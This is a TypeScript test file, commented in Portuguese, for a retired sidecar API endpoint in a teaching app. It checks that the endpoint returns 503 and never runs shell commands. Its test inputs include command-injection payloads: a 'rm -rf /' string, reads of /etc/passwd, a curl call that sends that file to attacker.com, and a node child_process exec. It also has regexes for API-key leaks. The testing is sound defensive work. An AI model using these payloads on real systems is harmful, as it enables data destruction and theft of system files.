/**
 * __tests__/sidecar-task.test.ts — A11: Testes de segurança do endpoint sidecar-task
 *
 * Com o sidecar Python aposentado na Fase 6 (C7), o endpoint /api/sidecar-task
 * deve retornar 503 para TODAS as requisições — sem executar nenhum processo,
 * sem aceitar parâmetros de command injection, sem polling de banco de dados.
 *
 * Estes testes verificam:
 *  1. GET retorna 503 (estado 'retired')
 *  2. POST retorna 503 para qualquer ação — incluindo payloads de injeção
 *  3. Nenhum processo shell é invocado
 *  4. Nenhuma chave de ambiente sensível vaza na resposta
 */

import { describe, it, expect, vi, beforeEach } from 'vitest'

// Mock do next/server para teste unitário
const mockJsonResponse = vi.fn()
vi.mock('next/server', () => ({
  NextRequest: class MockNextRequest {
    constructor(public url: string, public init?: RequestInit) {}
    async json() {
      return JSON.parse((this.init?.body as string) || '{}')
    }
    headers = {
      get: (_key: string) => null,
    }
  },
  NextResponse: {
    json: (data: unknown, init?: ResponseInit) => {
      mockJsonResponse(data, init)
      return { data, status: init?.status ?? 200 }
    },
  },
}))

// C7: Garante que child_process NÃO é importado pela rota
vi.mock('child_process', () => ({
  exec: vi.fn(() => { throw new Error('child_process.exec NÃO DEVE ser chamado — sidecar aposentado (C7)') }),
}))

// Importa as funções da rota APÓS os mocks
import { GET, POST } from '@/app/api/sidecar-task/route'
import { NextRequest } from 'next/server'

describe('/api/sidecar-task — Sidecar aposentado (C7, A11)', () => {
  beforeEach(() => {
    mockJsonResponse.mockClear()
  })

  // ─── GET ────────────────────────────────────────────────────────────────────

  describe('GET', () => {
    it('retorna HTTP 503 com estado retired', async () => {
      await GET()
      expect(mockJsonResponse).toHaveBeenCalledOnce()
      const [_data, init] = mockJsonResponse.mock.calls[0]
      expect(init?.status).toBe(503)
    })

    it('inclui code SIDECAR_RETIRED na resposta', async () => {
      await GET()
      const [data] = mockJsonResponse.mock.calls[0]
      expect(data).toMatchObject({ code: 'SIDECAR_RETIRED' })
    })

    it('inclui instrução de migração para extensão v3.1', async () => {
      await GET()
      const [data] = mockJsonResponse.mock.calls[0]
      expect(data.migration_guide).toContain('TeacherAI v3.1')
    })

    it('não vaza variáveis de ambiente sensíveis', async () => {
      await GET()
      const [data] = mockJsonResponse.mock.calls[0]
      const responseStr = JSON.stringify(data)
      expect(responseStr).not.toMatch(/SUPABASE_SERVICE_ROLE_KEY/i)
      expect(responseStr).not.toMatch(/sk-[a-zA-Z0-9]{20,}/i) // OpenAI key pattern
      expect(responseStr).not.toMatch(/gsk_[a-zA-Z0-9]{20,}/i) // Groq key pattern
    })
  })

  // ─── POST ───────────────────────────────────────────────────────────────────

  describe('POST', () => {
    const makeRequest = (body: unknown) =>
      new NextRequest('http://localhost/api/sidecar-task', {
        method: 'POST',
        body: JSON.stringify(body),
      })

    it('retorna HTTP 503 para ação prepare_chrome', async () => {
      await POST(makeRequest({ action: 'prepare_chrome' }))
      const [_data, init] = mockJsonResponse.mock.calls[0]
      expect(init?.status).toBe(503)
    })

    it('retorna HTTP 503 para ação read_page_content', async () => {
      await POST(makeRequest({ action: 'read_page_content', goal: 'lista de alunos' }))
      const [_data, init] = mockJsonResponse.mock.calls[0]
      expect(init?.status).toBe(503)
    })

    it('retorna HTTP 503 para ação read_roster', async () => {
      await POST(makeRequest({ action: 'read_roster' }))
      const [_data, init] = mockJsonResponse.mock.calls[0]
      expect(init?.status).toBe(503)
    })

    it('retorna HTTP 503 para ação rediscover_portal', async () => {
      await POST(makeRequest({ action: 'rediscover_portal' }))
      const [_data, init] = mockJsonResponse.mock.calls[0]
      expect(init?.status).toBe(503)
    })

    // ── Payloads de injeção (A11 — command injection) ─────────────────────────

    it('A11: não executa comando shell com payload de injeção via goal', async () => {
      // Antes: goal era inserido direto em strings de shell
      // Payload: fecha aspas e injeta comando malicioso
      const maliciousGoal = '"; rm -rf / ; echo "'
      await POST(makeRequest({ action: 'read_page_content', goal: maliciousGoal }))
      // Deve retornar 503 sem executar nada
      const [_data, init] = mockJsonResponse.mock.calls[0]
      expect(init?.status).toBe(503)
    })

    it('A11: não executa comando shell com payload de injeção via pageHint', async () => {
      const maliciousHint = '`cat /etc/passwd`'
      await POST(makeRequest({ action: 'read_page_content', pageHint: maliciousHint }))
      const [_data, init] = mockJsonResponse.mock.calls[0]
      expect(init?.status).toBe(503)
    })

    it('A11: não executa comando shell com payload de injeção via portalUrl', async () => {
      const maliciousUrl = 'https://portal.com"; curl http://attacker.com/$(cat /etc/passwd) #'
      await POST(makeRequest({ action: 'prepare_chrome', portalUrl: maliciousUrl }))
      const [_data, init] = mockJsonResponse.mock.calls[0]
      expect(init?.status).toBe(503)
    })

    it('A11: não executa comando shell com payload de injeção via outputFormat', async () => {
      const maliciousFormat = '"; node -e "require(\'child_process\').exec(\'id\')" ; "'
      await POST(makeRequest({ action: 'read_page_content', outputFormat: maliciousFormat }))
      const [_data, init] = mockJsonResponse.mock.calls[0]
      expect(init?.status).toBe(503)
    })

    it('inclui code SIDECAR_RETIRED na resposta POST', async () => {
      await POST(makeRequest({ action: 'any_action' }))
      const [data] = mockJsonResponse.mock.calls[0]
      expect(data).toMatchObject({ code: 'SIDECAR_RETIRED' })
    })

    it('não vaza variáveis de ambiente sensíveis no POST', async () => {
      await POST(makeRequest({ action: 'read_page_content', goal: 'test' }))
      const [data] = mockJsonResponse.mock.calls[0]
      const responseStr = JSON.stringify(data)
      expect(responseStr).not.toMatch(/SUPABASE_SERVICE_ROLE_KEY/i)
    })
  })
})
